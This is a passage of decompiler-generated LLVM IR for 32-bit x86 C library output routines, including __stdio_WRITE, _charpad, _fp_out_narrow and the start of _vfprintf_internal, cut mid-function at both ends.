  br i1 %v1_804dfc2, label %dec_label_pc_804dfde, label %dec_label_pc_804dfd7

dec_label_pc_804dfd7:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804df90 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804dfe1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dfde

dec_label_pc_804dfde:                             ; preds = %entry, %dec_label_pc_804dfd7
  %v0_804dfe1 = phi i32 [ %v4_804dfba, %entry ], [ %v0_804dfe1.pre, %dec_label_pc_804dfd7 ]
  %v2_804dfe3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dfe3, i32* @ebx, align 4
  store i32 %v0_804df3a, i32* @esi, align 4
  store i32 %v0_804df39, i32* @edi, align 4
  store i32 %v0_804df38, i32* @ebp, align 4
  ret i32 %v0_804dfe1

; uselistorder directives
  uselistorder i32 %v1_804df8b, { 1, 0 }
  uselistorder i32 %v1_804df68, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804dfde, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_804dfe9 = load i32, i32* @edi, align 4
  %v0_804dfeb = load i32, i32* @ebx, align 4
  %v15_804dfec = ptrtoint i32* %stack_var_-28 to i32
  %v4_804dfef = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dfef, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804dffb4 = icmp eq i32 %arg3, 0
  store i1 %v1_804dffb4, i1* %zf.global-to-local, align 1
  br i1 %v1_804dffb4, label %dec_label_pc_804e05c, label %dec_label_pc_804e000.lr.ph

dec_label_pc_804e000.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e000

dec_label_pc_804e000:                             ; preds = %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge, %dec_label_pc_804e000.lr.ph
  %v0_804e00d = phi i32 [ %v4_804dfef, %dec_label_pc_804e000.lr.ph ], [ %v0_804e00d.pre, %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge ]
  %v0_804e00c = phi i32 [ %arg2, %dec_label_pc_804e000.lr.ph ], [ %v2_804e01e, %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge ]
  %v0_804e008.in = phi i32 [ %arg3, %dec_label_pc_804e000.lr.ph ], [ %v2_804e01c, %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge ]
  %v4_804e008 = phi i32 [ %arg3, %dec_label_pc_804e000.lr.ph ], [ %v2_804e01c, %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge ]
  %v0_804e008 = icmp slt i32 %v0_804e008.in, 0
  store i32 %v4_804e008, i32* %esi.global-to-local, align 4
  %v2_804e008 = icmp eq i1 %v0_804e008, false
  %v5_804e008 = select i1 %v2_804e008, i32 %v4_804e008, i32 2147483647
  store i32 %v5_804e008, i32* %eax.global-to-local, align 4
  %v1_804e00d = add i32 %v0_804e00d, 4
  %v2_804e00d = inttoptr i32 %v1_804e00d to i32*
  %v3_804e00d = load i32, i32* %v2_804e00d, align 4
  %tmp36 = inttoptr i32 %v0_804e00c to i32*
  %v5_804e010 = call i32 @__libc_write(i32 %v3_804e00d, i32* %tmp36, i32 %v5_804e008)
  store i32 %v5_804e010, i32* %eax.global-to-local, align 4
  %v1_804e018 = icmp eq i32 %v5_804e010, 0
  store i1 %v1_804e018, i1* %zf.global-to-local, align 1
  %v2_804e018 = icmp slt i32 %v5_804e010, 0
  br i1 %v2_804e018, label %dec_label_pc_804e022, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %dec_label_pc_804e000
  %v0_804e01c = load i32, i32* @ebx, align 4
  %v2_804e01c = sub i32 %v0_804e01c, %v5_804e010
  %v12_804e01c = icmp eq i32 %v2_804e01c, 0
  store i32 %v2_804e01c, i32* @ebx, align 4
  %v0_804e01e = load i32, i32* @edi, align 4
  %v2_804e01e = add i32 %v0_804e01e, %v5_804e010
  store i32 %v2_804e01e, i32* @edi, align 4
  store i1 %v12_804e01c, i1* %zf.global-to-local, align 1
  br i1 %v12_804e01c, label %dec_label_pc_804e05c, label %dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge

dec_label_pc_804e01c.dec_label_pc_804e000_crit_edge: ; preds = %dec_label_pc_804e01c
  %v0_804e00d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e000

dec_label_pc_804e022:                             ; preds = %dec_label_pc_804e000
  %v0_804e022 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e022 = inttoptr i32 %v0_804e022 to i32*
  %v2_804e022 = load i32, i32* %v1_804e022, align 4
  store i32 %v2_804e022, i32* %eax.global-to-local, align 4
  %v1_804e025 = add i32 %v0_804e022, 8
  %v2_804e025 = inttoptr i32 %v1_804e025 to i32*
  %v3_804e025 = load i32, i32* %v2_804e025, align 4
  store i32 %v3_804e025, i32* @edx, align 4
  %v1_804e028 = or i32 %v2_804e022, 8
  store i32 %v1_804e028, i32* %eax.global-to-local, align 4
  %v1_804e02b = trunc i32 %v1_804e028 to i16
  %v3_804e02b = inttoptr i32 %v0_804e022 to i16*
  store i16 %v1_804e02b, i16* %v3_804e02b, align 2
  %v0_804e02f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e02f = add i32 %v0_804e02f, 12
  %v2_804e02f = inttoptr i32 %v1_804e02f to i32*
  %v3_804e02f = load i32, i32* %v2_804e02f, align 4
  %v1_804e032 = load i32, i32* @edx, align 4
  %v2_804e032 = sub i32 %v3_804e02f, %v1_804e032
  %v12_804e032 = icmp eq i32 %v2_804e032, 0
  store i1 %v12_804e032, i1* %zf.global-to-local, align 1
  store i32 %v2_804e032, i32* %eax.global-to-local, align 4
  %v4_804e058.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804e032, label %dec_label_pc_804e058, label %dec_label_pc_804e036

dec_label_pc_804e036:                             ; preds = %dec_label_pc_804e022
  %v12_804e036 = icmp eq i32 %v2_804e032, %v4_804e058.pre
  store i1 %v12_804e036, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_804e032, %v4_804e058.pre
  %v3_804e038 = load i32, i32* %esi.global-to-local, align 4
  %v5_804e038 = select i1 %tmp, i32 %v2_804e032, i32 %v3_804e038
  store i32 %v5_804e038, i32* %esi.global-to-local, align 4
  %v0_804e03b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e03b

dec_label_pc_804e03b:                             ; preds = %dec_label_pc_804e04d, %dec_label_pc_804e036
  %v2_804e03f = phi i32 [ %v1_804e049, %dec_label_pc_804e04d ], [ %v1_804e032, %dec_label_pc_804e036 ]
  %v4_804e03b = phi i32 [ %v4_804e03b.pre, %dec_label_pc_804e04d ], [ %v2_804e032, %dec_label_pc_804e036 ]
  %v0_804e03b = phi i32 [ %v1_804e04d, %dec_label_pc_804e04d ], [ %v0_804e03b.pre, %dec_label_pc_804e036 ]
  %v1_804e03b = inttoptr i32 %v0_804e03b to i8*
  %v2_804e03b = load i8, i8* %v1_804e03b, align 1
  %v3_804e03b = zext i8 %v2_804e03b to i32
  %v5_804e03b = and i32 %v4_804e03b, -256
  %v6_804e03b = or i32 %v3_804e03b, %v5_804e03b
  store i32 %v6_804e03b, i32* %eax.global-to-local, align 4
  %v10_804e03d = icmp eq i8 %v2_804e03b, 10
  store i1 %v10_804e03d, i1* %zf.global-to-local, align 1
  %v3_804e03f = inttoptr i32 %v2_804e03f to i8*
  store i8 %v2_804e03b, i8* %v3_804e03f, align 1
  %v0_804e041 = load i1, i1* %zf.global-to-local, align 1
  %v1_804e041 = icmp eq i1 %v0_804e041, false
  br i1 %v1_804e041, label %dec_label_pc_804e049, label %dec_label_pc_804e043

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804e03b
  %v0_804e043 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e043 = add i32 %v0_804e043, 1
  %v2_804e043 = inttoptr i32 %v1_804e043 to i8*
  %v3_804e043 = load i8, i8* %v2_804e043, align 1
  %v4_804e043 = urem i8 %v3_804e043, 2
  %v5_804e043 = icmp eq i8 %v4_804e043, 0
  store i1 %v5_804e043, i1* %zf.global-to-local, align 1
  %v1_804e047 = icmp eq i1 %v5_804e043, false
  br i1 %v1_804e047, label %dec_label_pc_804e043.dec_label_pc_804e050_crit_edge, label %dec_label_pc_804e049

dec_label_pc_804e043.dec_label_pc_804e050_crit_edge: ; preds = %dec_label_pc_804e043
  %v0_804e050.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e050

dec_label_pc_804e049:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804e03b
  %v0_804e049 = load i32, i32* @edx, align 4
  %v1_804e049 = add i32 %v0_804e049, 1
  store i32 %v1_804e049, i32* @edx, align 4
  %v0_804e04a = load i32, i32* %esi.global-to-local, align 4
  %v1_804e04a = add i32 %v0_804e04a, -1
  %v8_804e04a = icmp eq i32 %v1_804e04a, 0
  store i1 %v8_804e04a, i1* %zf.global-to-local, align 1
  store i32 %v1_804e04a, i32* %esi.global-to-local, align 4
  br i1 %v8_804e04a, label %dec_label_pc_804e049.dec_label_pc_804e050_crit_edge, label %dec_label_pc_804e04d

dec_label_pc_804e049.dec_label_pc_804e050_crit_edge: ; preds = %dec_label_pc_804e049
  %v1_804e050.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e050

dec_label_pc_804e04d:                             ; preds = %dec_label_pc_804e049
  %v0_804e04d = load i32, i32* @edi, align 4
  %v1_804e04d = add i32 %v0_804e04d, 1
  %v8_804e04d = icmp eq i32 %v1_804e04d, 0
  store i1 %v8_804e04d, i1* %zf.global-to-local, align 1
  store i32 %v1_804e04d, i32* @edi, align 4
  %v4_804e03b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e03b

dec_label_pc_804e050:                             ; preds = %dec_label_pc_804e049.dec_label_pc_804e050_crit_edge, %dec_label_pc_804e043.dec_label_pc_804e050_crit_edge
  %v1_804e050 = phi i32 [ %v0_804e043, %dec_label_pc_804e043.dec_label_pc_804e050_crit_edge ], [ %v1_804e050.pre, %dec_label_pc_804e049.dec_label_pc_804e050_crit_edge ]
  %v0_804e050 = phi i32 [ %v0_804e050.pre, %dec_label_pc_804e043.dec_label_pc_804e050_crit_edge ], [ %v1_804e049, %dec_label_pc_804e049.dec_label_pc_804e050_crit_edge ]
  %v2_804e050 = add i32 %v1_804e050, 16
  %v3_804e050 = inttoptr i32 %v2_804e050 to i32*
  store i32 %v0_804e050, i32* %v3_804e050, align 4
  %v0_804e053 = load i32, i32* @edx, align 4
  %v1_804e053 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e053 = add i32 %v1_804e053, 8
  %v3_804e053 = inttoptr i32 %v2_804e053 to i32*
  %v4_804e053 = load i32, i32* %v3_804e053, align 4
  %v5_804e053 = sub i32 %v0_804e053, %v4_804e053
  store i32 %v5_804e053, i32* @edx, align 4
  %v0_804e056 = load i32, i32* @ebx, align 4
  %v2_804e056 = sub i32 %v0_804e056, %v5_804e053
  %v12_804e056 = icmp eq i32 %v2_804e056, 0
  store i1 %v12_804e056, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e058

dec_label_pc_804e058:                             ; preds = %dec_label_pc_804e022, %dec_label_pc_804e050
  %v4_804e058 = phi i32 [ %v2_804e056, %dec_label_pc_804e050 ], [ %v4_804e058.pre, %dec_label_pc_804e022 ]
  %v5_804e058 = sub i32 %arg3, %v4_804e058
  %v15_804e058 = icmp eq i32 %v5_804e058, 0
  store i1 %v15_804e058, i1* %zf.global-to-local, align 1
  %v0_804e060.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e05c

dec_label_pc_804e05c:                             ; preds = %dec_label_pc_804e01c, %entry, %dec_label_pc_804e058
  %v0_804e060 = phi i32 [ %v0_804e060.pre, %dec_label_pc_804e058 ], [ %v15_804dfec, %entry ], [ %v15_804dfec, %dec_label_pc_804e01c ]
  %stack_var_12.0 = phi i32 [ %v5_804e058, %dec_label_pc_804e058 ], [ 0, %entry ], [ %arg3, %dec_label_pc_804e01c ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_804e060 = icmp eq i32 %v0_804e060, -12
  store i1 %v9_804e060, i1* %zf.global-to-local, align 1
  store i32 %v0_804dfeb, i32* @ebx, align 4
  store i32 %v0_804dfe9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804e04d, { 1, 2, 0 }
  uselistorder i32 %v1_804e04a, { 1, 0 }
  uselistorder i32 %v1_804e049, { 0, 2, 1 }
  uselistorder i8 %v2_804e03b, { 1, 0, 2 }
  uselistorder i32 %v4_804e058.pre, { 2, 0, 1 }
  uselistorder i32 %v2_804e032, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_804e01e, { 1, 0 }
  uselistorder i32 %v2_804e01c, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804e010, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_804e05c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e058, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e068 = load i32, i32* @edi, align 4
  %v0_804e069 = load i32, i32* @eax, align 4
  store i32 %v0_804e069, i32* @edi, align 4
  %v0_804e06b = load i32, i32* @esi, align 4
  %v0_804e06c = load i32, i32* @ecx, align 4
  store i32 %v0_804e06c, i32* @esi, align 4
  %v0_804e06e = load i32, i32* @ebx, align 4
  store i32 %v0_804e06c, i32* @ebx, align 4
  %v0_804e074 = load i32, i32* @edx, align 4
  store i32 %v0_804e074, i32* %stack_var_-13, align 4
  %v1_804e07b2 = icmp eq i32 %v0_804e06c, 0
  br i1 %v1_804e07b2, label %dec_label_pc_804e093, label %dec_label_pc_804e07f.lr.ph

dec_label_pc_804e07f.lr.ph:                       ; preds = %entry
  %v2_804e07f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e07f

dec_label_pc_804e07a:                             ; preds = %dec_label_pc_804e07f
  %v1_804e07a = add i32 %v0_804e07a, -1
  %v8_804e07a = icmp eq i32 %v1_804e07a, 0
  store i32 %v1_804e07a, i32* @ebx, align 4
  br i1 %v8_804e07a, label %dec_label_pc_804e093.loopexit, label %dec_label_pc_804e07a.dec_label_pc_804e07f_crit_edge

dec_label_pc_804e07a.dec_label_pc_804e07f_crit_edge: ; preds = %dec_label_pc_804e07a
  %v0_804e083.pre = load i32, i32* @edx, align 4
  %v0_804e084.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e07f

dec_label_pc_804e07f:                             ; preds = %dec_label_pc_804e07a.dec_label_pc_804e07f_crit_edge, %dec_label_pc_804e07f.lr.ph
  %v0_804e084 = phi i32 [ %v0_804e084.pre, %dec_label_pc_804e07a.dec_label_pc_804e07f_crit_edge ], [ %v0_804e069, %dec_label_pc_804e07f.lr.ph ]
  %v0_804e083 = phi i32 [ %v0_804e083.pre, %dec_label_pc_804e07a.dec_label_pc_804e07f_crit_edge ], [ %v0_804e074, %dec_label_pc_804e07f.lr.ph ]
  %v4_804e088 = call i32 @__stdio_fwrite(i32 %v2_804e07f, i32 1, i32 %v0_804e084, i32 %v0_804e083)
  %v8_804e090 = icmp eq i32 %v4_804e088, 1
  %v0_804e07a = load i32, i32* @ebx, align 4
  br i1 %v8_804e090, label %dec_label_pc_804e07a, label %dec_label_pc_804e093.loopexit

dec_label_pc_804e093.loopexit:                    ; preds = %dec_label_pc_804e07a, %dec_label_pc_804e07f
  %v1_804e096.ph = phi i32 [ %v0_804e07a, %dec_label_pc_804e07f ], [ 0, %dec_label_pc_804e07a ]
  %v0_804e096.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e093

dec_label_pc_804e093:                             ; preds = %dec_label_pc_804e093.loopexit, %entry
  %v0_804e096 = phi i32 [ 0, %entry ], [ %v0_804e096.pre, %dec_label_pc_804e093.loopexit ]
  %v1_804e096 = phi i32 [ 0, %entry ], [ %v1_804e096.ph, %dec_label_pc_804e093.loopexit ]
  %v2_804e096 = sub i32 %v0_804e096, %v1_804e096
  store i32 %v0_804e06e, i32* @ebx, align 4
  store i32 %v0_804e06b, i32* @esi, align 4
  store i32 %v0_804e068, i32* @edi, align 4
  ret i32 %v2_804e096

; uselistorder directives
  uselistorder i32 %v1_804e07a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e093.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e0b1 = trunc i32 %arg2 to i8
  %v5_804e0b1 = icmp slt i8 %v3_804e0b1, 0
  %v1_804e0b3 = icmp eq i1 %v5_804e0b1, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e0b3, label %dec_label_pc_804e0e4, label %dec_label_pc_804e0b5

dec_label_pc_804e0b5:                             ; preds = %entry
  %v3_804e0bc = call i32 @strlen(i8* %arg4)
  %v0_804e0c4 = load i32, i32* @ebx, align 4
  %v2_804e0c4 = sub i32 %v0_804e0c4, %v3_804e0bc
  store i32 %v2_804e0c4, i32* @ebx, align 4
  store i32 %v3_804e0bc, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e0c4, 1
  br i1 %tmp23, label %dec_label_pc_804e0e2, label %dec_label_pc_804e0cc

dec_label_pc_804e0cc:                             ; preds = %dec_label_pc_804e0b5
  store i32 %arg1, i32* @eax, align 4
  %v0_804e0d0 = load i32, i32* @edi, align 4
  %v1_804e0d0 = urem i32 %v0_804e0d0, 128
  store i32 %v1_804e0d0, i32* @edi, align 4
  store i32 %v2_804e0c4, i32* @ecx, align 4
  store i32 %v1_804e0d0, i32* @edx, align 4
  %v0_804e0d7 = call i32 @_charpad()
  %v12_804e0dc = icmp eq i32 %v0_804e0d7, %v2_804e0c4
  store i32 %v0_804e0d7, i32* @ebp, align 4
  %v1_804e0e0 = icmp eq i1 %v12_804e0dc, false
  br i1 %v1_804e0e0, label %dec_label_pc_804e0fe, label %dec_label_pc_804e0cc.dec_label_pc_804e0e2_crit_edge

dec_label_pc_804e0cc.dec_label_pc_804e0e2_crit_edge: ; preds = %dec_label_pc_804e0cc
  %v0_804e0e2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e0e2

dec_label_pc_804e0e2:                             ; preds = %dec_label_pc_804e0cc.dec_label_pc_804e0e2_crit_edge, %dec_label_pc_804e0b5
  %v0_804e0e2 = phi i32 [ %v0_804e0e2.pre, %dec_label_pc_804e0cc.dec_label_pc_804e0e2_crit_edge ], [ %v3_804e0bc, %dec_label_pc_804e0b5 ]
  store i32 %v0_804e0e2, i32* @ebx, align 4
  br label %dec_label_pc_804e0e4

dec_label_pc_804e0e4:                             ; preds = %entry, %dec_label_pc_804e0e2
  %v0_804e0ef = phi i32 [ %arg3, %entry ], [ %v0_804e0e2, %dec_label_pc_804e0e2 ]
  %tmp24 = icmp slt i32 %v0_804e0ef, 1
  br i1 %tmp24, label %dec_label_pc_804e0fc, label %dec_label_pc_804e0ea

dec_label_pc_804e0ea:                             ; preds = %dec_label_pc_804e0e4
  %v0_804e0ea = load i32, i32* @ecx, align 4
  %v5_804e0f4 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e0ef, i32 %arg1, i32 %v0_804e0ea)
  br label %dec_label_pc_804e0fc

dec_label_pc_804e0fc:                             ; preds = %dec_label_pc_804e0e4, %dec_label_pc_804e0ea
  %v1_804e0fc = phi i32 [ 0, %dec_label_pc_804e0e4 ], [ %v5_804e0f4, %dec_label_pc_804e0ea ]
  %v0_804e0fc = load i32, i32* @ebp, align 4
  %v2_804e0fc = add i32 %v0_804e0fc, %v1_804e0fc
  br label %dec_label_pc_804e0fe

dec_label_pc_804e0fe:                             ; preds = %dec_label_pc_804e0cc, %dec_label_pc_804e0fc
  %v0_804e101 = phi i32 [ %v0_804e0d7, %dec_label_pc_804e0cc ], [ %v2_804e0fc, %dec_label_pc_804e0fc ]
  ret i32 %v0_804e101

; uselistorder directives
  uselistorder i32 %v0_804e0ef, { 1, 0 }
  uselistorder i32 %v0_804e0d7, { 1, 2, 0 }
  uselistorder i32 %v1_804e0d0, { 1, 0 }
  uselistorder i32 %v2_804e0c4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0fe, { 1, 0 }
  uselistorder label %dec_label_pc_804e0fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e0e4, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e10b = load i32, i32* @ebx, align 4
  store i32 %v0_804e10b, i32* %stack_var_-16, align 4
  %v4_804e10b = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e10c = add i32 %v4_804e10b, -356
  %v10_804e10c = icmp slt i32 %v1_804e10c, 0
  store i1 %v10_804e10c, i1* %sf.global-to-local, align 1
  %v4_804e112 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e112, i32* @ebx, align 4
  %v2_804e11a = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e11a, i32* @esi, align 4
  %v5_804e11f = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e112)
  store i32 %v5_804e11f, i32* %eax.global-to-local, align 4
  %v2_804e127 = icmp slt i32 %v5_804e11f, 0
  store i1 %v2_804e127, i1* %sf.global-to-local, align 1
  %v1_804e129 = icmp eq i1 %v2_804e127, false
  br i1 %v1_804e129, label %dec_label_pc_804e169, label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %entry
  %v12_804e124 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e12b = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e12b, i32* @ebx, align 4
  %v1_804e12f = add i32 %v12_804e124, -12
  %v10_804e12f = icmp slt i32 %v1_804e12f, 0
  store i1 %v10_804e12f, i1* %sf.global-to-local, align 1
  %v5_804e132 = inttoptr i32 %v3_804e12b to i8*
  %v3_804e133 = call i32 @strlen(i8* %v5_804e132)
  store i32 %v3_804e133, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e142 = icmp eq i32 %v3_804e133, 0
  %v2_804e142 = icmp slt i32 %v3_804e133, 0
  store i1 %v2_804e142, i1* %sf.global-to-local, align 1
  br i1 %v1_804e142, label %dec_label_pc_804e6b2, label %dec_label_pc_804e14a

dec_label_pc_804e14a:                             ; preds = %dec_label_pc_804e12b
  %v0_804e14a = load i32, i32* @edx, align 4
  %v0_804e153 = load i32, i32* @ebx, align 4
  %v6_804e154 = call i32 @__stdio_fwrite(i32 %v0_804e153, i32 %v3_804e133, i32 %arg1, i32 %v0_804e14a)
  store i32 %v6_804e154, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e161 = load i32, i32* @esp, align 4
  %v1_804e161 = add i32 %v0_804e161, 16
  %v7_804e161 = icmp slt i32 %v1_804e161, 0
  store i1 %v7_804e161, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e6b2

dec_label_pc_804e169:                             ; preds = %entry
  %v6_804e173 = call i32 @_ppfs_prepargs(i32 %v2_804e11a, i32 %arg3, i32 %v5_804e11f, i32 %v5_804e11f)
  store i32 %v6_804e173, i32* %eax.global-to-local, align 4
  %v0_804e178 = load i32, i32* @ebx, align 4
  store i32 %v0_804e178, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e182 = load i32, i32* @esp, align 4
  %v1_804e182 = add i32 %v0_804e182, 16
  %v7_804e182 = icmp slt i32 %v1_804e182, 0
  store i1 %v7_804e182, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e188

dec_label_pc_804e187:                             ; preds = %dec_label_pc_804e18e
  %v1_804e187 = add i32 %v0_804e196, 1
  %v9_804e187 = icmp slt i32 %v1_804e187, 0
  store i1 %v9_804e187, i1* %sf.global-to-local, align 1
  store i32 %v1_804e187, i32* @ebx, align 4
  br label %dec_label_pc_804e188.backedge

dec_label_pc_804e188.backedge:                    ; preds = %dec_label_pc_804e187, %dec_label_pc_804e698, %dec_label_pc_804e6a3
  %v1_804e19222 = phi i32 [ %v1_804e19a, %dec_label_pc_804e187 ], [ %v3_804e698, %dec_label_pc_804e698 ], [ %v1_804e1c6, %dec_label_pc_804e6a3 ]
  %v0_804e18820 = phi i32 [ %v1_804e187, %dec_label_pc_804e187 ], [ %v3_804e698, %dec_label_pc_804e698 ], [ %v1_804e6a3, %dec_label_pc_804e6a3 ]
  %v4_804e188.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e188

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e188.backedge, %dec_label_pc_804e169
  %v1_804e19a = phi i32 [ %v1_804e19222, %dec_label_pc_804e188.backedge ], [ %v0_804e178, %dec_label_pc_804e169 ]
  %v0_804e196 = phi i32 [ %v0_804e18820, %dec_label_pc_804e188.backedge ], [ %v0_804e178, %dec_label_pc_804e169 ]
  %v4_804e188 = phi i32 [ %v4_804e188.pre, %dec_label_pc_804e188.backedge ], [ %v6_804e173, %dec_label_pc_804e169 ]
  %v1_804e188 = inttoptr i32 %v0_804e196 to i8*
  %v2_804e188 = load i8, i8* %v1_804e188, align 1
  %v3_804e188 = zext i8 %v2_804e188 to i32
  %v5_804e188 = and i32 %v4_804e188, -256
  %v6_804e188 = or i32 %v3_804e188, %v5_804e188
  store i32 %v6_804e188, i32* %eax.global-to-local, align 4
  %v4_804e18a = icmp eq i8 %v2_804e188, 0
  %v5_804e18a = icmp slt i8 %v2_804e188, 0
  store i1 %v5_804e18a, i1* %sf.global-to-local, align 1
  br i1 %v4_804e18a, label %dec_label_pc_804e192, label %dec_label_pc_804e18e

dec_label_pc_804e18e:                             ; preds = %dec_label_pc_804e188
  %v2_804e18e = add i8 %v2_804e188, -37
  %v10_804e18e = icmp eq i8 %v2_804e18e, 0
  %v11_804e18e = icmp slt i8 %v2_804e18e, 0
  store i1 %v11_804e18e, i1* %sf.global-to-local, align 1
  %v1_804e190 = icmp eq i1 %v10_804e18e, false
  br i1 %v1_804e190, label %dec_label_pc_804e187, label %dec_label_pc_804e192

dec_label_pc_804e192:                             ; preds = %dec_label_pc_804e18e, %dec_label_pc_804e188
  %v2_804e192 = sub i32 %v0_804e196, %v1_804e19a
  %v12_804e192 = icmp eq i32 %v2_804e192, 0
  %v13_804e192 = icmp slt i32 %v2_804e192, 0
  store i1 %v13_804e192, i1* %sf.global-to-local, align 1
  br i1 %v12_804e192, label %dec_label_pc_804e1bd, label %dec_label_pc_804e196

dec_label_pc_804e196:                             ; preds = %dec_label_pc_804e192
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e192, i32* @esi, align 4
  store i1 %v13_804e192, i1* %sf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_804e192, 1
  br i1 %tmp67, label %dec_label_pc_804e1b2, label %dec_label_pc_804e1a0

dec_label_pc_804e1a0:                             ; preds = %dec_label_pc_804e196
  %v0_804e1a0 = load i32, i32* @ebp, align 4
  %v1_804e1a0 = load i32, i32* @esp, align 4
  %v2_804e1a0 = add i32 %v1_804e1a0, -4
  %v3_804e1a0 = inttoptr i32 %v2_804e1a0 to i32*
  store i32 %v0_804e1a0, i32* %v3_804e1a0, align 4
  %v1_804e1a1 = add i32 %v1_804e1a0, 368
  %v2_804e1a1 = inttoptr i32 %v1_804e1a1 to i32*
  %v3_804e1a1 = load i32, i32* %v2_804e1a1, align 4
  %v5_804e1a1 = add i32 %v1_804e1a0, -8
  %v6_804e1a1 = inttoptr i32 %v5_804e1a1 to i32*
  store i32 %v3_804e1a1, i32* %v6_804e1a1, align 4
  %v0_804e1a8 = load i32, i32* @esi, align 4
  %v2_804e1a8 = add i32 %v1_804e1a0, -12
  %v3_804e1a8 = inttoptr i32 %v2_804e1a8 to i32*
  store i32 %v0_804e1a8, i32* %v3_804e1a8, align 4
  %v0_804e1a9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1a9 = add i32 %v1_804e1a0, -16
  %v3_804e1a9 = inttoptr i32 %v2_804e1a9 to i32*
